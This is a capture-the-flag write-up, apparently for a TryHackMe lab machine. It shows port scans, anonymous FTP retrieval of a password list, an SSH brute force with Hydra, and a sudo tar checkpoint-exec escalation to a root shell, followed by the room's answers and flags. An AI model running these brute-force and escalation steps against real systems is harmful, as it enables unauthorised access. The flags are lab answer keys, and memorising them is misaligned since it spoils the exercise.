

```
nmap -p- -v 10.10.49.200 

└─# nmap -p- 10.10.49.200
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-13 13:38 UTC
Nmap scan report for ip-10-10-49-200.eu-west-1.compute.internal (10.10.49.200)
Host is up (0.0018s latency).
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:7A:A9:14:40:BD (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 47.78 seconds
```


```
─# nmap -p 80,21,22 -sVC 10.10.49.200 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-13 13:40 UTC
Nmap scan report for ip-10-10-49-200.eu-west-1.compute.internal (10.10.49.200)
Host is up (0.00030s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.145.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:7A:A9:14:40:BD (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.16 seconds

```

```
└─# ftp 10.10.49.200 
Connected to 10.10.49.200.
220 (vsFTPd 3.0.3)
Name (10.10.49.200:root): anonymous 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||15274|)

^C
receive aborted. Waiting for remote to finish abort.
ftp> ls 
229 Entering Extended Passive Mode (|||41615|)
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt

```

```
get locks.txt 
get task.txt
```

```
└─# hydra -l lin -P locks.txt 10.10.49.200 ssh -t 24  
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-13 14:13:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 24 tasks per 1 server, overall 24 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.49.200:22/
[22][ssh] host: 10.10.49.200   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-13 14:13:46

```

```
└─# ssh lin@10.10.49.200 
The authenticity of host '10.10.49.200 (10.10.49.200)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.49.200' (ED25519) to the list of known hosts.
lin@10.10.49.200's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ 
cat usr.txt
```

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

cd /root 
cat root.txt
```
#### Questions


Deploy the machine.
```

```

Find open ports on the machine
```
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Who wrote the task list? 
```
lin
```

What service can you bruteforce with the text file found?
```
SSH
```

What is the users password? 
```
RedDr4gonSynd1cat3
```

user.txt
```
THM{CR1M3_SyNd1C4T3}
```

root.txt
```
THM{80UN7Y_h4cK3r}
```